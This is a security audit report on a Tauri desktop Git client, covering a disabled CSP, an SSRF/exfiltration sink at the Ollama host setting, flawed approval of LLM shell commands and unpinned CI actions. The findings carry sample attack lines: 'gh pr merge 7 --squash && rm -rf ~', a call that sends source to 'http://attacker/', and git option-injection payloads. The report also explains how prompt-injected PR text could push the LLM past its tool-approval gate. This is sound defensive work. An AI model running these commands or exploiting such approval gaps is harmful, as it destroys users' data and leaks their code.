# Security Audit Report

- **Date:** 2026-06-05
- **Analyzed path:** `C:\Users\coren\Documents\projet\mon-repo` (gitui)
- **Stack detected:** Tauri v2 desktop app — **Rust** core (`src-tauri/`, shells out to `git` / `gh` / `claude` via `proc::`, runs `portable-pty` PTYs, `ureq` HTTP client to Ollama) + **React 19 / TypeScript / Tailwind v4 / Vite 7** frontend (`src/`). CI: **GitHub Actions** (`.github/workflows/release.yml`, `tauri-action`). No Docker / Terraform / Kubernetes / cloud IaC.
- **Method:** 5 parallel specialized agents (SAST, DAST, Dependencies, Secrets, Infra/IaC) → deduplicated, CVSS-v3.1-approximated, and reconciled by the orchestrator. Raw per-agent output is preserved in `sast.json`, `dast.json`, `deps.json`, `secrets.json`, `infra.json`. Machine-readable aggregate in `findings.sarif`.

---

## Executive Summary

gitui has a **fundamentally sound, least-privilege core** — every subprocess is spawned as an argv vector through a single `proc::` wrapper (no shell interpolation anywhere), Markdown is rendered safely (react-markdown v10, no `rehype-raw` / `dangerouslySetInnerHTML`), Tauri capabilities are minimal, **no real secrets are committed**, and dependencies are clean (`npm audit`: 0 vulns; no exploitable Rust CVEs). The risk is concentrated not in classic injection sinks but in **trust-boundary and hardening gaps** that matter for a tool that ingests *untrusted data from cloned repos / PRs* and *runs an LLM with shell access*: the webview ships with **no Content-Security-Policy**, an LLM tool-approval prefix can be **escalated to arbitrary commands**, the Ollama endpoint is an **unvalidated SSRF / plaintext-exfiltration sink**, and the **release pipeline that builds the shipped installers uses mutable, unpinned actions and produces unsigned artifacts**. None are remotely exploitable *today* without a precondition (an XSS sink — currently none exists — or a user action), but together they convert "I reviewed a malicious PR / cloned a hostile repo" into a credible path to code execution on the developer's machine. **Fix the 4 P0 items before any public release.**

## Statistics (deduplicated & severity-reconciled)

| Severity | Count |
|----------|-------|
| Critical | 0     |
| High     | 4     |
| Medium   | 6     |
| Low      | 9     |
| Info     | 16    |
| **Total (deduped)** | **35** |

> Raw findings before dedup: **45** (SAST 8, DAST 11, Deps 13, Secrets 2, Infra 11). Overlapping findings were merged (CSP ×3, Ollama host ×3, git arg-injection ×3, opener/URL ×2) and a few severities were reconciled across agents — see *Deduplication & reconciliation notes* below.

### Deduplication & reconciliation notes (transparency)

- **CSP disabled** — reported by 3 agents at 3 severities (DAST-001 *critical*, INFRA-001 *medium*, SAST-006 *low*). **Reconciled to High.** It is not *actively* exploitable today (no HTML-injection sink exists — react-markdown is safe), so "critical" overstates present exploitability; but it is the force-multiplier that turns any future/transitive XSS into full IPC→RCE, and it is a one-line fix. → **P0**.
- **Ollama host SSRF + exfiltration** — merged SAST-001 (read/SSRF), SAST-002 (write/exfil) and DAST-004 (both) into one. **Reconciled to High** (data-exfiltration of repo source over plaintext HTTP). → **P0**.
- **git argument injection** — merged SAST-004 (`clone`), SAST-005 (branch/ref) and DAST-007 (`cherry-pick`/`show`/`checkout`) into one class. → **Medium / P1**.
- **Untrusted URL opening** — merged SAST-003 (no scheme check on `c.link`) with DAST-006 (unscoped `opener` capability). → **Medium / P1**.
- **Unsigned artifacts** (INFRA-009) **bumped low→Medium**: in the context of the unpinned release pipeline, the lack of any signature is a real distribution-integrity gap. → **P1**.
- **No rate-limiting** (DAST-008) **reconciled medium→Low**: only reachable *after* an XSS that already yields RCE-equivalent control, so throttling is marginal. → **P2**.
- Two of the audit's seed premises were **disproven** by the Deps agent and are *not* findings: `lucide-react@1.17.0` is the genuine current release (not a typosquat), and a `package-lock.json` **is** committed (installs are reproducible).

---

## 🔴 P0 — Critical / High (must fix before any deployment)

### P0-1 — Content-Security-Policy is disabled (`csp: null`)
- **Severity:** High · **CVSS approx:** 7.4 (`AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H`, contingent on a sink) · **Sources:** DAST-001, INFRA-001, SAST-006
- **Location:** [`src-tauri/tauri.conf.json:23`](src-tauri/tauri.conf.json:23) — `"security": { "csp": null }`

For a Tauri app the CSP is the single most important runtime control. With it `null`, the webview enforces no policy, so **any** script that executes in the frontend can reach every `#[tauri::command]` via `window.__TAURI__`/`invoke`. The frontend renders attacker-influenceable, network-sourced text everywhere — PR/issue titles & bodies, CI check names, commit messages & diffs (from `gh`/`git` on a *cloned* repo), Ollama model names, and AI/chat output. Today none of these are script-execution sinks (Markdown is escaped — see the positive note in P2), so this is **defense-in-depth, not a live RCE** — but the moment any raw-HTML sink appears (a `rehype-raw` addition, a custom renderer, a vulnerable transitive dep), it becomes "clone a hostile repo → RCE on the dev's box." It is also the multiplier behind P0-3, P1-1, P1-2, and P1-4.

**Remediation** — set a strict CSP and tighten until the app still loads:
```jsonc
// src-tauri/tauri.conf.json
"app": {
  "security": {
    "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' ipc: http://ipc.localhost; object-src 'none'; base-uri 'none'; frame-ancestors 'none'"
  }
}
```
Leave `dangerousDisableAssetCspModification` at its default so Tauri keeps injecting nonces/hashes. Avoid `'unsafe-inline'`/`'unsafe-eval'` for `script-src`.

### P0-2 — Ollama host is an unvalidated SSRF & plaintext data-exfiltration sink
- **Severity:** High · **CVSS approx:** 7.1 (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`) · **Sources:** DAST-004, SAST-001, SAST-002
- **Locations:** [`src-tauri/src/commands.rs:96`](src-tauri/src/commands.rs:96) (`ollama_models` → `ureq` GET), [`src-tauri/src/assist/mod.rs:130`](src-tauri/src/assist/mod.rs:130) (host → `ANTHROPIC_BASE_URL` for every `claude` spawn)

`set_ai_backend` / `ollama_models` accept a `host: String` straight from the webview with **no scheme/host/port validation and no allowlist**. It is used two ways:
1. **SSRF (read):** `ollama_models` issues `GET <host>/api/tags` through a `ureq` client built with `default-features = false` (**TLS disabled** — cleartext only, trivially MITM-able). The host can be `http://169.254.169.254/…` (cloud metadata), `http://127.0.0.1:<port>/…` (loopback admin services), or any LAN host; response/error text returns to the UI, enabling internal port/service enumeration.
2. **Exfiltration (write):** in Ollama mode the host is injected verbatim as `ANTHROPIC_BASE_URL` into **every** spawned `claude` process. The prompts embed sensitive repo content — full commit diffs, PR diffs/titles/bodies, and raw conflicted working-tree files (base/ours/theirs). Injected JS (`set_ai_backend('ollama','http://attacker/','x','')`) or a tricked user silently ships the repository's source to an arbitrary plaintext endpoint.

**Remediation** — validate the host before any use (apply in `set_ai_config` *and* re-validate on startup):
```rust
fn validate_ollama_host(h: &str) -> Result<String> {
    let u = url::Url::parse(h).map_err(|_| AppError::new("Hôte Ollama invalide"))?;
    if u.scheme() != "http" && u.scheme() != "https" { return Err(AppError::new("schéma non autorisé")); }
    match u.host_str() {
        Some("localhost") | Some("127.0.0.1") | Some("::1") => {} // loopback only by default
        _ => return Err(AppError::new("hôte Ollama doit être local (ou confirmé explicitement)")),
    }
    Ok(u.to_string().trim_end_matches('/').to_string())
}
```
At minimum block link-local/metadata ranges (`169.254.0.0/16`, `100.64.0.0/10`), require explicit user confirmation + `https://` (with TLS enabled in `ureq`) for any non-loopback host, and surface the active backend/host prominently in the UI so silent reconfiguration is visible.

### P0-3 — LLM compound-command approval whitelists arbitrary sub-commands, session-wide
- **Severity:** High · **CVSS approx:** 7.3 (`AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`) · **Source:** DAST-002 (verified against source)
- **Location:** [`src/components/ChatDock.tsx:65`](src/components/ChatDock.tsx:65) (`toolPatterns`) + `approve()` persistence into `approvedRef`

In the chat "merge" flow, `claude` runs with only `READONLY_TOOLS`; a write is denied and the UI asks the user to approve. `toolPatterns()` splits the denied command on `&&`, `||`, `;`, `|` and emits **one `Bash(<prefix>:*)` pattern per sub-command**. **Verified:** `gh pr merge 7 --squash && rm -rf ~` → `["Bash(gh pr merge:*)", "Bash(rm:*)"]`. The modal shows the *full* command (a user skimming for "gh pr merge" may click Autoriser), but `approve()` pushes **all** derived patterns — including `Bash(rm:*)` — into `approvedRef`, which is sent as `extra_allowed` on **every subsequent** `chat_send`. Consequences: (a) approving one compound merge silently whitelists `rm` (and any tacked-on verb) for the rest of the session; (b) prefixes are coarse — `Bash(git push:*)` permits `git push --force`, `Bash(git merge:*)` permits `--no-verify`. A prompt-injection reaching the model (from PR/commit/diff text it is asked to review) can escalate one innocuous-looking approval into arbitrary command execution.

**Remediation:**
- Refuse to auto-approve compound commands: if the command contains `&&`, `||`, `;`, `|`, or a newline, present each sub-command separately and require **per-part** approval (or ask the model to issue one command at a time).
- Never add a pattern the user did not see described 1:1. Prefer allow-listing **exact argument vectors** over `verb:*` for destructive verbs.
- **Scope approvals to a single turn** — clear `approvedRef` after the approved command runs instead of persisting it for the whole session.

### P0-4 — Release pipeline uses an unpinned `tauri-action` to build the shipped installers
- **Severity:** High · **CVSS approx:** 8.1 (`AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H`) · **Source:** INFRA-006
- **Location:** [`.github/workflows/release.yml:69`](.github/workflows/release.yml:69) — `uses: tauri-apps/tauri-action@v0`

`tauri-action` is the most security-critical step in the pipeline: it builds and bundles the per-platform installers (`.msi`/`.exe`/`.dmg`/`.AppImage`/`.deb`/`.rpm`) and uploads them to the GitHub Release, holding a `contents: write` `GITHUB_TOKEN`. Referencing it by the **mutable `@v0` tag** means a retagged or compromised release runs with full ability to inject malicious code into the exact binaries end users install — a direct software-supply-chain compromise. (The other four unpinned actions are P1-6; this one is escalated because it controls the final shipped artifacts.)

**Remediation** — pin to a full commit SHA and let Dependabot bump it:
```yaml
- uses: tauri-apps/tauri-action@<full-40-char-sha>   # v0.5.x
# .github/dependabot.yml:
# - package-ecosystem: "github-actions"
#   directory: "/"
#   schedule: { interval: "weekly" }
```
Combine with code signing (P1-5) so even a CI compromise yields artifacts clients can reject.

---

## 🟡 P1 — Medium (fix within the current sprint)

### P1-1 — `READONLY_TOOLS` allowlist is not actually read-only
- **Severity:** Medium (borderline High) · **CVSS approx:** 6.8 · **Source:** DAST-005
- **Location:** [`src-tauri/src/assist/mod.rs:484`](src-tauri/src/assist/mod.rs:484) — `Bash(git show:*)`, `Bash(git log:*)`, `Bash(git diff:*)`, …

These tools are pre-approved (no prompt) for all three AI funnels. The `:*` wildcard allows arbitrary arguments, and `git log`/`diff`/`show` are **not purely read-only**: against a *malicious clone* they can be steered to execute external programs (`-c core.pager=<cmd>`, `-c diff.external=<cmd>`, `--ext-diff`, `GIT_EXTERNAL_DIFF`/textconv via `.gitattributes`) or write files (`--output=<path>`, `-O<file>`). So a prompt-injected model operating *only within the "safe" allowlist* can achieve command execution / file write without ever tripping the approval modal.

**Remediation:** run these via a hardened wrapper that strips dangerous options (`-c`, `--output`, `-O`, `--ext-diff`, `--open-files-in-pager`) and sets a safe env (`GIT_PAGER=cat`, `GIT_EXTERNAL_DIFF=`, `-c core.pager=cat`, `-c protocol.ext.allow=never`), or constrain the allowed argument shapes instead of `verb:*`. Treat the analyzed repo as untrusted input.

### P1-2 — Argument injection across git invocations (no `--` separator, leading-dash accepted)
- **Severity:** Medium · **CVSS approx:** 5.9 · **Sources:** SAST-004, SAST-005, DAST-007
- **Locations:** [`src-tauri/src/commands.rs:193`](src-tauri/src/commands.rs:193) (`git clone <url>`), [`src-tauri/src/commands.rs:1046`](src-tauri/src/commands.rs:1046) (`cherry-pick <sha>`), [`src-tauri/src/git/mod.rs:173`](src-tauri/src/git/mod.rs:173) (`checkout -b <name>`), plus `commit_detail`/`analyze_commit`/`checkout` (`git show`/`checkout <ref>`)

Frontend-supplied URLs / refs / branch names are passed as positional git args with no `--` terminator and no leading-dash rejection. The sharpest instance is `clone_repo`: a `url` like `--upload-pack=<cmd>` or an `ext::sh -c "…"` transport is parsed as a flag → local command execution. Spawning is argv-based (no shell) so this is *argument* injection, not shell injection, and git's default protocol allowlist mitigates `ext::` (git ≥ 2.12) — but it remains exploitable, especially as several of these refs feed `git show`/`diff` (see P1-1).

**Remediation:**
```rust
// clone_repo
if url.starts_with('-') { return Err(AppError::new("URL invalide")); }
let r = proc::run_env("git", ["clone", "--", url, target_str.as_str()],
    Some(parent), &[("GIT_TERMINAL_PROMPT","0"), ("GIT_ALLOW_PROTOCOL","https:ssh:git")]);
```
For ref/sha-taking commands, validate via `git rev-parse --verify --end-of-options <v>` before use (as `resolve_on_branch` already does for commit-editing), reject leading `-`, and add `--` before positional refs where the subcommand supports it. Validate branch names against `git check-ref-format`.

### P1-3 — Untrusted URLs opened via the unscoped `opener` capability without scheme validation
- **Severity:** Medium · **CVSS approx:** 5.4 · **Sources:** SAST-003, DAST-006
- **Locations:** [`src-tauri/capabilities/default.json:6`](src-tauri/capabilities/default.json:6) (`opener:default` → includes unscoped `allow-open-url`), [`src/components/PrPage.tsx:489`](src/components/PrPage.tsx:489) (`openUrl(c.link)`)

`PrPage` opens the per-check `link` from `gh pr checks --json …,link` with `openUrl()` and **no scheme/host validation**. That value is attacker-influenceable — anyone who can configure a CI check on a repo the user reviews controls it — so a `file://` or custom-scheme value launches with one click (no XSS required). The capability grants unscoped `allow-open-url`, so injected JS could also open arbitrary schemes directly.

**Remediation:** validate before opening, and tighten the capability:
```ts
function safeOpen(raw: string) {
  try { const u = new URL(raw);
    if (u.protocol === "https:" || u.protocol === "http:") openUrl(u.toString());
  } catch { /* ignore non-URLs */ }
}
// use safeOpen(c.link) — and for every openUrl fed from gh/git output
```
In `capabilities/default.json`, replace `opener:default` with only the scoped permission you need (`allow-default-urls`, ideally a custom scope limited to `https://github.com/*`), dropping the unscoped `allow-open-url` / `allow-reveal-item-in-dir`.

### P1-4 — Dangerous IPC primitives are ungated; webview is implicitly trusted
- **Severity:** Medium (contingent on P0-1) · **CVSS approx:** 5.5 · **Source:** DAST-003
- **Location:** [`src-tauri/src/lib.rs:30`](src-tauri/src/lib.rs:30) (`invoke_handler` registration)

Every `#[tauri::command]` is callable by any script in the webview; combined with the null CSP (P0-1), injected JS can invoke all of them. The genuinely dangerous primitives: `open_in_vscode` (Windows: spawns `cmd /c code <repo>` — shells through `cmd`), `clone_repo` (see P1-2), `create_markdown`/`apply_conflict_resolution` (write caller-controlled file content into the repo, then `git add`+commit), `term_open_*`/`chat_open_*` (spawn the real `claude` CLI — terminal path has **no** chat approval gate), and `submit`/`reword_commit`/`split_commit`/`cherry_pick` (history rewrite + force-push). No command distinguishes a user click from a programmatic `invoke`.

**Remediation:** (1) fix P0-1 first; (2) spawn `code` directly via `proc::` rather than shelling through `cmd /c`; (3) move the most destructive primitives behind a **native** confirmation dialog the webview cannot auto-confirm; (4) consider a separate narrowly-scoped capability for destructive commands.

### P1-5 — Distributed installers are unsigned (no code signing / updater key)
- **Severity:** Medium (bumped from Low) · **CVSS approx:** 5.9 · **Source:** INFRA-009
- **Location:** [`src-tauri/tauri.conf.json:27`](src-tauri/tauri.conf.json:27) — `"targets": "all"`, no signing config

No macOS `signingIdentity`/notarization, no Windows Authenticode (`signCommand`/`certificateThumbprint`), and no updater pubkey; CI passes no signing secrets. Users (and any future auto-updater) have **no cryptographic way to verify** the installers came from this pipeline untampered — which directly compounds the supply-chain exposure of P0-4 and P1-6.

**Remediation:** configure platform signing for release builds — macOS Developer ID + notarization (`bundle.macOS.signingIdentity`, `hardenedRuntime`, entitlements) and Windows Authenticode (`bundle.windows.signCommand`/`certificateThumbprint`), injecting certs via Actions secrets. If/when auto-update is added, configure the Tauri updater with a minisign pubkey and keep the private key only in CI secrets.

### P1-6 — Remaining GitHub Actions pinned to mutable tags/branches
- **Severity:** Medium · **CVSS approx:** 6.5 · **Sources:** INFRA-002, INFRA-003, INFRA-004, INFRA-005
- **Location:** [`.github/workflows/release.yml`](.github/workflows/release.yml) — `actions/checkout@v4` (L36), `actions/setup-node@v4` (L50), `dtolnay/rust-toolchain@stable` (L55, a **moving branch**), `swatinem/rust-cache@v2` (L61)

Each runs in the privileged release job (`contents: write` + `GITHUB_TOKEN`); a retagged/compromised release executes arbitrary code there. `@stable` (a branch) and the caching action (which can poison the restored build cache) are the most sensitive.

**Remediation:** pin all four to full commit SHAs (with a trailing `# vX.Y.Z` comment) and enable the Dependabot `github-actions` ecosystem to keep them current (see P0-4).

---

## 🟢 P2 — Low / Informational (backlog)

**Low (hardening / maintenance):**
- **DAST-009** — `GIT_TERMINAL_PROMPT=0` only set on `clone`; set it (plus `GIT_ASKPASS=true`, `-c credential.helper=`, `-c protocol.ext.allow=never`) uniformly in the central `proc::run`/`git()` wrapper. `git/mod.rs:7`.
- **SAST-007** — `GIT_EDITOR`/`GIT_SEQUENCE_EDITOR` built as shell strings (`cp '<temp>'`); single quotes in the path aren't escaped. Path is app-controlled (not user-reachable) so it's fragility, not a live injection. `git/mod.rs:271`.
- **DAST-008** — no server-side rate-limiting / provenance check on destructive ops (`submit`, `clone_repo`, PTY spawns); only reachable post-XSS. Add coalescing + native confirmation for bulk push/PR. `assist/mod.rs:89`.
- **INFRA-007** — `contents: write` granted job-wide across all matrix legs; add a top-level `permissions: contents: read` default and keep write only on the release-upload step/job. `release.yml:19`.
- **INFRA-008** — `tagName: ${{ github.ref_name }}` is attacker-influenceable but used as a *typed input* (not in a `run:` shell), so no injection; optionally add a semver-format guard. `release.yml:73`.
- **DEP-005** — `dagre@0.8.5` unmaintained (last release 2022); migrate to the maintained `@dagrejs/dagre` fork. Client-side only, no CVE.
- **DEP-008** — `gtk`/`gdk`/`glib`/… (gtk3-rs 0.18.x) **unmaintained** (RUSTSEC-2024-0413); transitive, **Linux-only**, gated behind Tauri/wry's gtk4 migration. Suppress in `cargo-audit`, track upstream.
- **DEP-009** — `proc-macro-error@1.0.4` unmaintained (RUSTSEC-2024-0370); **build-time-only** transitive dep, not in the shipped binary.
- **DEP-010** — `glib@0.18.5` soundness advisory (RUSTSEC-2024-0429, OOB read in `VariantStrIter`); Linux-only, not exercised by app code, fix gated behind glib ≥ 0.20 (gtk4 migration).

**Informational / positive controls (what's done right):**
- **DAST-010** *(watch item)* — Markdown rendering is **safe**: react-markdown v10, no `rehype-raw`, no `dangerouslySetInnerHTML`; untrusted bodies shown as escaped text. This is why the null CSP hasn't already produced repo→RCE. **Enforce "no rehype-raw / no dangerouslySetInnerHTML" as an invariant** (lint/test).
- **INFRA-011** — Tauri **capabilities are minimal** (no broad shell/fs/http scopes, no `dangerousRemoteDomainIpcAccess`, no `withGlobalTauri`, `assetProtocol` off). Healthy least-privilege baseline.
- **SEC-001 / SEC-002** — **No real secrets committed.** `ANTHROPIC_AUTH_TOKEN="ollama"` is Ollama's required-but-ignored placeholder; `${{ secrets.GITHUB_TOKEN }}` is the standard managed token. No `.env`, no private keys, no updater signing key in the tree.
- **DEP-004 / DEP-012 / DEP-013** — `npm audit`: **0 vulnerabilities** across 274 deps; the security-relevant Rust crates (tauri 2.11.2, tokio 1.52.3, url 2.5.8, time 0.3.47, …) are all past their advisory ranges; licenses are permissive (no GPL/AGPL pulled in by app choices).
- **DAST-011 / INFRA-010** — classic web-auth/session/CORS/headers and cloud-IaC checks are **N/A** (local desktop app, bundled frontend, no server, no containers); the real trust boundary is the release pipeline + Tauri capability/CSP model captured above.
- **General positives** — all subprocess execution is argv-based through `proc::` (**no shell interpolation anywhere**); `docs/mod.rs` has solid path-traversal defense (`safe_rel` + canonicalized boundary check); `valid_stash_ref` whitelists stash refs; no weak crypto.

---

## Recommended Next Steps (ordered action plan)

1. **Set a strict CSP** in `tauri.conf.json` (P0-1) — one line, highest leverage; re-test the app loads.
2. **Validate the Ollama host** (P0-2) — loopback-only by default; require explicit confirmation + HTTPS/TLS for remote; re-validate persisted settings on startup.
3. **Fix the LLM approval logic** (P0-3) — per-sub-command approval, no compound auto-approve, single-turn scope; this is the most concrete logic bug.
4. **Pin `tauri-action` to a SHA** (P0-4) and add **Dependabot** for `github-actions`; pin the other four actions (P1-6) in the same PR.
5. **Harden the "read-only" git allowlist** (P1-1) and add `--`/`rev-parse --verify` validation to ref/URL-taking commands (P1-2).
6. **Add `safeOpen()` URL validation + scope the `opener` capability** (P1-3); spawn `code` directly instead of via `cmd` (P1-4).
7. **Enable code signing** for release builds (P1-5).
8. **Add `cargo-audit` (or `cargo-deny`) and `npm ci`/`npm audit` to CI** (DEP-007/DEP-013) for ongoing coverage; install `cargo-audit` locally — it was **not** run in this audit (the Rust pass was a manual RUSTSEC cross-reference).
9. Work the remaining **P2** hardening items as backlog; add a lint/test enforcing the "no raw HTML in Markdown" invariant (DAST-010).

> **Scanner caveat:** `npm audit` ran (0 vulns). `cargo audit` did **not** run (`cargo-audit` not installed); the Rust dependency findings are a manual RUSTSEC cross-reference against `Cargo.lock` as of the knowledge cutoff and are **not** a substitute for a live DB query.
